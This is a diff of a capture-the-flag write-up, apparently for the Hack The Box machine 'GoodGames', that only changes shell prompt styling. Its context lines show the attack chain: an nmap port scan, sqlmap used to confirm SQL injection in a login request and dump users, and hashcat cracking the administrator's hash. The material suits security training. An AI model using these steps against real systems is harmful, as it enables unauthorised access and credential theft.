@@ -26,8 +26,7 @@ last_modified_at: '2026-09-04T12:04:05+01:00'
 I started with a full TCP scan to identify the services exposed by the target.
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/GoodGames]
-└──╼ $ sudo nmap -sC -sV -p- -T4 --min-rate 1000 --reason 10.129.96.71 -oN nmap/tcp_scan.nmap 
+tr3m0x@ubuntu:~/htb/linux/GoodGames$ sudo nmap -sC -sV -p- -T4 --min-rate 1000 --reason 10.129.96.71 -oN nmap/tcp_scan.nmap 
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-30 20:15 CET
 Stats: 0:00:38 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
 SYN Stealth Scan Timing: About 54.58% done; ETC: 20:17 (0:00:32 remaining)
@@ -54,8 +53,7 @@ After creating an account and signing in, I found at the bottom of the page and 
 I added `goodgames.htb` to `/etc/hosts` and continued with web enumeration.
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/GoodGames]
-└──╼ $ echo "10.129.96.71 goodgames.htb" | sudo tee -a /etc/hosts
+tr3m0x@ubuntu:~/htb/linux/GoodGames$ echo "10.129.96.71 goodgames.htb" | sudo tee -a /etc/hosts
 ```
 
 I tried to fuzz for vhosts but nothing appeared.<br>
@@ -80,8 +78,7 @@ I got **Internal server error!**<br>
 I saved the login request as `login.req` and used `sqlmap` to test its parameters for SQL injection.
 
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/GoodGames]
-└──╼ $ sqlmap -r login.req --level 5 --risk 3 --dbms=mysql --batch
+tr3m0x@ubuntu:~/htb/linux/GoodGames$ sqlmap -r login.req --level 5 --risk 3 --dbms=mysql --batch
 ```
 
 and the sqlinjection was confirmed. 
@@ -110,8 +107,7 @@ and then I dumped the user table.
 
 I saved the administrator's hash and attempted to crack it offline:
 ```bash
-┌─[tr3m0x@parrot]─[~/htb/linux/GoodGames]
-└──╼ $ hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt 
+tr3m0x@ubuntu:~/htb/linux/GoodGames$ hashcat -m 0 admin.hash /usr/share/wordlists/rockyou.txt 
 hashcat (v6.2.6) starting
 
 OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
